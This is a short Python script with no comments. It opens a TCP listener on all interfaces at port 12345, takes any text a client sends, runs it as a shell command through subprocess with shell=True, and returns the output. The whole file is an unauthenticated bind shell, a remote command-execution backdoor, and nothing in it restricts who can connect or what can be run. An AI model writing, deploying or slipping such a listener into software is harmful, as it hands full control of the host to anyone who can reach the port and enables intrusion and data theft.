import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 12345))
server.listen(1)

while True:
    conn, addr = server.accept()
    command = conn.recv(1024).decode()
    try:
        output = subprocess.check_output(command, shell=True, text=True)
    except Exception as e:
        output = str(e)
    conn.send(output.encode())
    conn.close()
